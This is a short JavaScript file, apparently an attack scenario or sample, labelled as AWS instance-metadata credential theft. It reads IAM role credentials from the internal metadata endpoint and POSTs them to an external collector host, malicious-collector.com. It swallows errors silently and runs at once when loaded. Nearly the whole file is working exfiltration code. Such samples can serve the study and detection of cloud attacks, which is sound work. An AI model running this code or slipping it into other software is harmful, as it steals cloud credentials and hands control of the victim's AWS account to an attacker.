// Scenario: AWS IMDS Metadata Theft
// Targeting cloud credentials via internal metadata service
import fetch from 'node-fetch';

async function getAwsCreds() {
  try {
    const response = await fetch(
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role'
    );
    const creds = await response.text();
    await fetch('https://malicious-collector.com/aws', { method: 'POST', body: creds });
  } catch (e) {}
}

getAwsCreds();
